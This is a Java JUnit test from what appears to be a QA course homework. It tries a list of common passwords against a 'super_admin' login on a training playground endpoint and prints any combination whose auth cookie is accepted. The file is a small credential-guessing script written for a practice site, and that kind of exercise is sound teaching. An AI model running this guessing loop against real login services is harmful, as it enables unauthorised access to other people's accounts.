package tests;

import io.qameta.allure.Description;
import io.qameta.allure.Epic;
import io.qameta.allure.Feature;
import io.qameta.allure.Link;
import io.qameta.allure.Owner;
import io.restassured.RestAssured;
import io.restassured.response.Response;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

@Epic("Hometasks")
@Feature("Ex9: Password bumping")
public class Ex9PasswordBumpingTest {

    @Test
    @Owner(value="Sergey Rybakin")
    @Link(name="Hometask Ex9", url="https://software-testing.ru/lms/mod/assign/view.php?id=307982")
    @Description("Positive POST test. Password bumping.")
    @DisplayName("Positive POST test. Password bumping.")
    public void testEx9PasswordBumping() {
        Map<String, String> data = new HashMap<>();
        data.put("login", "super_admin");
        List<String> passwords = new ArrayList<>();
        fillPasswords(passwords);
        passwords.forEach(p -> {
            System.out.println(p);
            data.put("password", p);

            Response response = RestAssured
                    .given()
                    .body(data)
//                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String authCookie = response.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            if (authCookie != null)
            {
                cookies.put("auth_cookie", authCookie);
            }

            Response responseForCheck = RestAssured
                    .given()
                    .body(data)
                    .cookies(cookies)
//                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            if(!responseForCheck.asString().contains("NOT"))
            {
                System.out.println("====================================================");
                responseForCheck.print();
                System.out.println("Login: " + data.get("login") + " Password: " + p);
                System.out.println("====================================================");
            }
        });
    }

    private void fillPasswords(List<String> passwords){
        passwords.add("password");
        passwords.add("1234");
        passwords.add("12345");
        passwords.add("123456");
        passwords.add("1234567");
        passwords.add("12345678");
        passwords.add("123456789");
        passwords.add("1234567890");
        passwords.add("qwerty");
        passwords.add("abc123");
        passwords.add("football");
        passwords.add("monkey");
        passwords.add("111111");
        passwords.add("letmein");
        passwords.add("dragon");
        passwords.add("baseball");
        passwords.add("sunshine");
        passwords.add("iloveyou");
        passwords.add("trustno1");
        passwords.add("princess");
        passwords.add("adobe123");
        passwords.add("admin");
        passwords.add("welcome");
        passwords.add("login");
        passwords.add("1q2w3e4r");
        passwords.add("master");
        passwords.add("letmein");
        passwords.add("666666");

    }
}
